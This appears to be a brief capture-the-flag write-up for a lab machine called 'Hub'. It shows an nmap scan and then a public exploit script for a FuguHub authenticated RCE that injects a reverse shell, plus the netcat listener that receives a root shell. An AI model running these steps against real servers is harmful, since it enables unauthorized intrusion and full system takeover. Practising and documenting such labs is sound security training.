##### Tags: `github`  `FuguHub`  `webenum`  

# 🐧Hub🐧
## Enumeration
Nmap
```
$ nmap -p- -T4 -sV 192.168.143.25
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-08 13:53 AEDT
Nmap scan report for 192.168.143.25
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http     nginx 1.18.0
8082/tcp open  http     Barracuda Embedded Web Server
9999/tcp open  ssl/http Barracuda Embedded Web Server
```
port 80 is Forbidden page  
port 9999 is empty page  
port 8082 is running FuguHub  

search FuguHub on github and found the exploit script  

https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697?tab=readme-ov-file#python-exploit
```
$ python3 exploit.py -r 192.168.143.25 -rp 8082 -l 192.168.45.201 -p 80

[*] Checking for admin user...
[+] An admin user exists..
[+] Logging in...
[+] Success! Injecting the reverse shell...
[+] Successfully injected the reverse shell into the About page.
[+] Triggering the reverse shell, check your listener...
```

```
$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.143.25] 49246
id
uid=0(root) gid=0(root) groups=0(root)
```
